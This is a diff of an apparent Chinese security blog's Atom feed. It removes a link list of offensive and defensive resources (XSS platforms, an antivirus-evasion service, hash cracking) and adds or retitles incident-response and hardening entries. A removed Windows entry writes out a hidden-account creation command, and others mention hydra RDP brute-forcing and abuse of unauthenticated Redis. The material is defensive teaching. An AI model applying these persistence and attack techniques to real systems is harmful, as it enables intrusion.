支持VS Code、PyCharm、Intellj、Visual Studio</a><br>        ​<a href="https://xinghuo.xfyun.cn/" target="_blank" rel="noopener noreferrer">讯飞星火认知大模型-AI大语言模型-星火大模型-科大讯飞</a><br></p>
-<h3>SRC</h3>
-<p><a href="https://www.vulbox.com/" target="_blank" rel="noopener noreferrer">漏洞盒子 - 中国领先的漏洞平台与白帽社区|安全众测与安全运营服务平台</a><br>        ​<a href="https://www.anquanke.com/src" target="_blank" rel="noopener noreferrer">国内漏洞响应平台（SRC）导航 - 安全客，安全资讯平台</a><br>        ​<a href="https://www.cnnvd.org.cn/home/childHome" target="_blank" rel="noopener noreferrer">国家信息安全漏洞库</a><br>        ​<a href="https://security.360.cn/" target="_blank" rel="noopener noreferrer">360安全应急响应中心</a><br>        ​<a href="https://src.sjtu.edu.cn/" target="_blank" rel="noopener noreferrer">教育漏洞报告平台(EDUSRC)<br>        </a><br>        ​<a href="https://www.butian.net/WhiteHat/Center" target="_blank" rel="noopener noreferrer">补天-漏洞_安全|系统漏洞_IoT|APP漏洞_移动|工控漏洞</a><br>        ​<a href="https://www.cnvd.org.cn/" target="_blank" rel="noopener noreferrer">国家信息安全漏洞共享平台</a><br>        ​<a href="https://xianzhi.aliyun.com/productitem/index.htm#/home" target="_blank" rel="noopener noreferrer">阿里云先知</a><br>        ​<a href="https://src.bytedance.com/home" target="_blank" rel="noopener noreferrer">字节跳动安全响应中心</a><br>        ​<a href="https://security.alibaba.com/" target="_blank" rel="noopener noreferrer">阿里安全响应中心</a><br>        ​<a href="https://sec.xiaomi.com/#/" target="_blank" rel="noopener noreferrer">小米安全中心</a><br>        ​<a href="https://security.tencent.com/index.php" target="_blank" rel="noopener noreferrer">腾讯安全应急响应中心</a><br>        ​<a href="https://security.sangfor.com.cn/dashboard" target="_blank" rel="noopener noreferrer">深信服安全应急响应中心</a><br>        ​<a href="https://www.huoxian.cn/" target="_blank" rel="noopener noreferrer">火线安全平台</a><br>        ​<a href="https://www.butian.net/" target="_blank" rel="noopener noreferrer">补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC</a><br>        ​<a href="https://promotional.gxycc.cmcqly.com:444/" target="_blank" rel="noopener noreferrer">promotional.gxycc.cmcqly.com:444</a><br>        ​<a href="https://www.ddpoc.com/" target="_blank" rel="noopener noreferrer">DayDayPoc</a><br>        ​<a href="https://blog.csdn.net/sdb5858874/article/details/80677304" target="_blank" rel="noopener noreferrer">针对单个网站的渗透思路（精）_拿到一个网站渗透有什么思路-CSDN博客</a><br></p>
-<h3>Tools</h3>
-<p><a href="https://config.net.cn/tools/HtmlEncode.html" target="_blank" rel="noopener noreferrer">在线Html实体编码解码-HTML Entity Encoding/Decoding</a><br>        ​<a href="https://www.edu-learn4fun.com/course/1863/task/61216/show" target="_blank" rel="noopener noreferrer">任务学习 - 易启学 - 智能化教育领导者</a><br>        ​<a href="https://pranx.com/just-prank/" target="_blank" rel="noopener noreferrer">Just A Prank Bro! Don't worry!</a><br>        ​<a href="http://bypass.tidesec.com/exp/" target="_blank" rel="noopener noreferrer">潮影在线免杀平台</a><br>        ​<a href="https://www.cmd5.com/" target="_blank" rel="noopener noreferrer">md5在线解密破解,md5解密加密</a><br>        ​<a href="https://xss.pt/xss.php?do=login" target="_blank" rel="noopener noreferrer">XSS平台 - （支持http/https）XSS Platform</a><br>        ​<a href="https://xssaq.com/index.html" target="_blank" rel="noopener noreferrer">XSS平台-XSS测试网站-仅用于安全免费测试</a><br>        ​<a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer">MD5免费在线解密破解_MD5在线加密-SOMD5</a><br>        ​<a href="https://rivers.chaitin.cn/toolkit?rc=BSYHBD2Q556NSZ3MBPZDNJUHGOATYDUS&amp;from=safeline-ce" target="_blank" rel="noopener noreferrer">长亭百川云在线工具</a><br></p>
-<h3>range</h3>
-<p><a href="https://www.yaklang.com/Yaklab/vulinbox/vulinbox/" target="_blank" rel="noopener noreferrer">Vulinbox 靶场介绍和安装 | Yak Program Language</a><br>        ​<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener noreferrer">BUUCTF在线评测</a><br>        ​<a href="https://ctf.bugku.com/" target="_blank" rel="noopener noreferrer">首页 - Bugku CTF</a><br>        ​<a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener noreferrer">CTFHub</a><br>        ​<a href="http://vulfocus.youze.xn--6qq986b3xl:81/" target="_blank" rel="noopener noreferrer">vulfocus</a><br>        ​<a href="https://vulhub.org/" target="_blank" rel="noopener noreferrer">Vulhub - Docker-Compose file for vulnerability environment</a><br>        ​<a href="https://avd.aliyun.com/" target="_blank" rel="noopener noreferrer">阿里云漏洞库</a><br>        ​<a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">设计易受攻击 ~ VulnHub</a><br>        ​<a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener noreferrer">WebGoat/WebGoat: WebGoat is a deliberately insecure application</a><br>        ​<a href="http://113.45.183.4/#/login?redirect=%2Fdashboard" target="_blank" rel="noopener noreferrer">vulfocus</a><br>        ​<a href="https://academy.hackthebox.com/dashboard" target="_blank" rel="noopener noreferrer">挡泥板</a><br></p>
-<h3>nav</h3>
-<p><a href="https://youze.xn--6qq986b3xl/" target="_blank" rel="noopener noreferrer">卷卷的小世界 – 卷卷</a><br>        ​<a href="https://www.shentoushi.top/" target="_blank" rel="noopener noreferrer">渗透师 网络安全从业者安全导航</a><br>        ​<a href="https://dh.aabyss.cn/" target="_blank" rel="noopener noreferrer">渊龙Sec安全团队导航</a><br></p>
-<h3>github</h3>
-<p><a href="https://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a><br>        ​<a href="https://github.com/guchangan1/All-Defense-Tool" target="_blank" rel="noopener noreferrer">All-Defense-Tool: 全网优秀的攻防武器工具项目，包含自动化利用，子域名、目录扫描、端口扫描等信息收集工具，各大中间件、cms、OA漏洞利用工具，爆破工具、内网横向、免杀、社工钓鱼以及应急响应、甲方安全资料等其他安全攻防资料。</a><br>        ​<a href="https://github.com/asxez/DockerDesktop-CN" target="_blank" rel="noopener noreferrer">Docker汉化 Docker中文版</a><br>        ​<a href="https://github.com/zggsong/stranslate" target="_blank" rel="noopener noreferrer">一款即开即用、即用即走的翻译、OCR工具开发的即用型翻译工具</a><br>        ​<a href="https://github.com/vvmdx/Sec-Interview-4-2023?tab=readme-ov-file#0x23-%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%B7%B1%E8%93%9D%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4" target="_blank" rel="noopener noreferrer">一个2023届毕业生在毕业前持续更新、收集的安全岗面试题及面试经验分享~</a><br>        ​<a href="https://github.com/Cobalt-Strike" target="_blank" rel="noopener noreferrer">Cobalt Strike</a><br>        ​<a href="https://github.com/SecWiki/sec-chart" target="_blank" rel="noopener noreferrer">SecWiki/sec-chart: 安全思维导图集合</a><br>        ​<a href="https://gitee.com/bafangwy-domain/Network-security" target="_blank" rel="noopener noreferrer">网络安全面试题: 网络安全相关知识总结，包括网络安全基础、Web安全、漏洞复现、等级保护、风险评估、逆向免杀等等，面试必备！</a><br>        ​<a href="https://github.com/knownsec/404StarLink#community" target="_blank" rel="noopener noreferrer">404StarLink: 推荐优质、有意义、有趣、坚持维护的安全开源项目</a><br>        ​<a href="https://github.com/FiveAourThe/RedTeamTools?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">FiveAourThe/RedTeamTools: 分享红队常用的工具</a><br>        ​[iami317/Penetration_POC: 渗透测试有关的POC、EXP、脚本、提权、小工具等</p>
-]]></content>
-    <published>2025-01-21T16:41:57.000Z</published>
-  </entry>
-  <entry>
     <title type="text">学习Docker-Compose命令及镜像构建与推送</title>
     <id>https://min168.top/net/%E5%AD%A6%E4%B9%A0Docker-Compose%E5%91%BD%E4%BB%A4%E5%8F%8A%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E4%B8%8E%E6%8E%A8%E9%80%81.html</id>
     <link href="https://min168.top/net/%E5%AD%A6%E4%B9%A0Docker-Compose%E5%91%BD%E4%BB%A4%E5%8F%8A%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E4%B8%8E%E6%8E%A8%E9%80%81.html"/>
@@ -10503,10 +10460,10 @@ a 代表 "所有用户"（所有者、组和其他）。<br>
     <published>2025-01-21T16:41:57.000Z</published>
   </entry>
   <entry>
-    <title type="text">Linux入侵排查</title>
-    <id>https://min168.top/response/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html</id>
-    <link href="https://min168.top/response/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
+    <title type="text">Linux系统入侵排查实战手册</title>
+    <id>https://min168.top/response/Linux%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C.html</id>
+    <link href="https://min168.top/response/Linux%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <p>安全排查步骤</p>
 <p>攻击类型定位——&gt;时间范围——&gt;文件分析——&gt;进程分析——&gt;系统分析——&gt;日志分析——&gt;关联分析——&gt;逻辑推理——&gt;事件总结</p>
@@ -10607,10 +10564,10 @@ a 代表 "所有用户"（所有者、组和其他）。<br>
     <published>2024-10-17T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">Linux安全加固</title>
-    <id>https://min168.top/response/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html</id>
-    <link href="https://min168.top/response/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
+    <title type="text">Linux系统安全加固实战指南</title>
+    <id>https://min168.top/response/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/response/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h4>用户管理</h4>
 <h5>特权用户排查</h5>
 <p>UID=0为特权账号</p>
@@ -10683,10 +10640,10 @@ systemctl restart sshd			#service sshd restart</p>
     <published>2024-10-14T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">RDP和360星图使用</title>
-    <id>https://min168.top/response/RDP%E5%92%8C360%E6%98%9F%E5%9B%BE%E4%BD%BF%E7%94%A8.html</id>
-    <link href="https://min168.top/response/RDP%E5%92%8C360%E6%98%9F%E5%9B%BE%E4%BD%BF%E7%94%A8.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
+    <title type="text">RDP远程爆破与360星图日志审计</title>
+    <id>https://min168.top/response/RDP%E8%BF%9C%E7%A8%8B%E7%88%86%E7%A0%B4%E4%B8%8E360%E6%98%9F%E5%9B%BE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1.html</id>
+    <link href="https://min168.top/response/RDP%E8%BF%9C%E7%A8%8B%E7%88%86%E7%A0%B4%E4%B8%8E360%E6%98%9F%E5%9B%BE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h3>通过hydra爆破windwos虚拟机的RDP服务，利用日志分析工具获取IP地址和时间以及用户名</h3>
 <ol>
@@ -10779,10 +10736,10 @@ systemctl restart sshd			#service sshd restart</p>
     <published>2025-01-12T13:43:01.000Z</published>
   </entry>
   <entry>
-    <title type="text">Redis日志分析</title>
-    <id>https://min168.top/response/Redis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.html</id>
-    <link href="https://min168.top/response/Redis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
+    <title type="text">Redis日志分析与安全审计</title>
+    <id>https://min168.top/response/Redis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1.html</id>
+    <link href="https://min168.top/response/Redis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>linux搭建一个redis服务，配置未授权和记录redis日志，开启redis服务，并使用未授权攻击行为进行写计划任务；然后进行入侵排查，分析redis日志和攻击行为。</p>
 <div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> redis</span></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></summary>
@@ -10857,199 +10814,108 @@ systemctl restart sshd			#service sshd restart</p>
     <published>2024-10-17T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">windows入侵排查</title>
-    <id>https://min168.top/response/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html</id>
-    <link href="https://min168.top/response/windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html"/>
-    <updated>2025-02-08T14:18:57.000Z</updated>
-    <summary type="html"><![CDATA[<p>1、入侵特点</p>
-<p>2、走哪里入侵</p>
-<p>3、针对性的排查</p>
-<p>主要关注：进程、账号、网络活动、启动项目、日志</p>
-<h2>1、口令、端口</h2>
-<p>检查：询问管理员、通过注册表；nmap扫描（或者询问管理员的资产台账中的端口信息）</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>namp -p1-65535  -sV IP</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></summary>
-    <content type="html"><![CDATA[<p>1、入侵特点</p>
-<p>2、走哪里入侵</p>
-<p>3、针对性的排查</p>
-<p>主要关注：进程、账号、网络活动、启动项目、日志</p>
-<h2>1、口令、端口</h2>
-<p>检查：询问管理员、通过注册表；nmap扫描（或者询问管理员的资产台账中的端口信息）</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>namp -p1-65535  -sV IP</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果能登录服务器：</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>netstat -ano</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>C:\Users\root&gt;netstat -ano</span></span>
-<span class="line"><span></span></span>
-<span class="line"><span>活动连接</span></span>
-<span class="line"><span></span></span>
-<span class="line"><span>  协议  本地地址          外部地址        状态           PID</span></span>
-<span class="line"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       984</span></span>
-<span class="line"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span></span>
-<span class="line"><span>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       516</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       776</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       628</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1272</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1600</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2708</span></span>
-<span class="line"><span>  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       768</span></span>
-<span class="line"><span>  TCP    0.0.0.0:55888          0.0.0.0:0              LISTENING       6112</span></span>
-<span class="line"><span>  TCP    127.0.0.1:53000        0.0.0.0:0              LISTENING       5936</span></span>
-<span class="line"><span>  TCP    192.168.188.128:139    0.0.0.0:0              LISTENING       4</span></span>
-<span class="line"><span>  TCP    192.168.188.128:62482  20.198.162.76:443      ESTABLISHED     3448</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>2 可疑账号</h2>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法1</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法2</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lusrmgr.msc</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法3</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">regedit</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</p>
-<p>注意：要先给SAM文件当前用户的读取权限</p>
-<p>2.4 D盾查看是否存在克隆账号、隐藏账号</p>
-<p>test$   隐藏账号</p>
-<h1>克隆账号和隐藏账号如何创建★必会</h1>
-<p>1、创建普通隐藏账号</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>C:\Windows\system32&gt;net user test$ test123 /add</span></span>
-<span class="line"><span>命令成功完成。</span></span>
-<span class="line"><span></span></span>
-<span class="line"><span></span></span>
-<span class="line"><span>C:\Windows\system32&gt;net user</span></span>
-<span class="line"><span></span></span>
-<span class="line"><span>\\DESKTOP-6N9H4HS 的用户帐户</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
-    <category term="应急响应"/>
-    <published>2024-10-18T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">windows安全加固</title>
-    <id>https://min168.top/response/windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html</id>
-    <link href="https://min168.top/response/windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
-    <summary type="html"><![CDATA[<h3>计算机管理</h3>
-<h4>本地用户和组</h4>
-<h6>禁用账户</h6>
-<p>禁用guest（来宾用户） 删除其他用户（先核查再删除）</p>
+    <title type="text">Web中间件安全加固实战指南</title>
+    <id>https://min168.top/response/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/response/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<h3>apache  --httpd</h3>
+<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
+<p>日志文件路径:/var/log/httpd</p>
+<h4>查看是否有apache账号</h4>
 <p>​​</p>
-<p>图标有向下箭头标识被禁用。</p>
+<h4>限制目录及子目录权限</h4>
+<p>chmod -R 600 /etc/httpd/    (目录下文件全为600)</p>
 <p>​​</p>
-<h6>不显示最后登录名</h6>
+<p>单独配置文件设置权限</p>
+<p>chmod 600 /etc/httpd/conf/httpd.conf</p>
+<h4>日志配置</h4>
+<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>]]></summary>
+    <content type="html"><![CDATA[<h3>apache  --httpd</h3>
+<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
+<p>日志文件路径:/var/log/httpd</p>
+<h4>查看是否有apache账号</h4>
 <p>​​</p>
-<h3>本地安全策略</h3>
+<h4>限制目录及子目录权限</h4>
+<p>chmod -R 600 /etc/httpd/    (目录下文件全为600)</p>
 <p>​​</p>
-<h4>账户策略</h4>
+<p>单独配置文件设置权限</p>
+<p>chmod 600 /etc/httpd/conf/httpd.conf</p>
+<h4>日志配置</h4>
+<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
+<p>日志文件路径:/var/log/httpd</p>
 <p>​​</p>
-<h5>密码策略</h5>
-<h6>密码最小长度限制</h6>
+<p><strong>注意：所有配置重启服务生效★</strong></p>
+<p><span data-type="text" style="color: var(--b3-font-color10);">systemctl start httpd</span></p>
+<h6>错误日志配置路径和记录等级</h6>
 <p>​​</p>
-<h6>密码复杂度要求</h6>
-<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>如果启用此策略，密码必须符合下列最低要求: 启用</span></span>
-<span class="line"><span>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</span></span>
-<span class="line"><span>至少有六个字符长</span></span>
-<span class="line"><span>包含以下四类字符中的三类字符:</span></span>
-<span class="line"><span>英文大写字母(A 到 Z)</span></span>
-<span class="line"><span>英文小写字母(a 到 z)</span></span>
-<span class="line"><span>10 个基本数字(0 到 9)</span></span>
-<span class="line"><span>非字母字符(例如 !、$、#、%)</span></span>
-<span class="line"><span>在更改或创建密码时执行复杂性要求</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></summary>
-    <content type="html"><![CDATA[<h3>计算机管理</h3>
-<h4>本地用户和组</h4>
-<h6>禁用账户</h6>
-<p>禁用guest（来宾用户） 删除其他用户（先核查再删除）</p>
+<h5>使用apachel用户组和apachel用户</h5>
+<p>使用apachel用户组和apachel用户启动中间件防止越权</p>
 <p>​​</p>
-<p>图标有向下箭头标识被禁用。</p>
+<h5>禁止显示Apache目录列表</h5>
+<p>Options Indexes FollowSymLinks   (未注释会列出)</p>
 <p>​​</p>
-<h6>不显示最后登录名</h6>
+<h5>拒绝服务-超时退出</h5>
+<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Timeout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> #客户端和服务端建立链接超时的时间间隔</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">keepAlive on #存活开启</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">keepAliveTimeout </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> #限制每一个用户生存时间5分钟...根据实际业务情况</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h5>隐藏中间件信息</h5>
+<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">ServerSignature</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Off</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">serverTokens Prod</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">TraceEnable</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Off</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
 <p>​​</p>
-<h3>本地安全策略</h3>
+<h5>禁用CGI</h5>
+<p>（注释掉即禁用）</p>
 <p>​​</p>
-<h4>账户策略</h4>
+<h5>禁用非法的HTTP服务</h5>
+<p>(设了白名单)</p>
+<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;Location </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;LimitExcept </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">GET POST CONNECT OPTIONS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Order</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> allow,deny</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Deny</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> from all</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/LimitExcept&gt;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/Location&gt;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h2>tomcat</h2>
+<p>配置文件：</p>
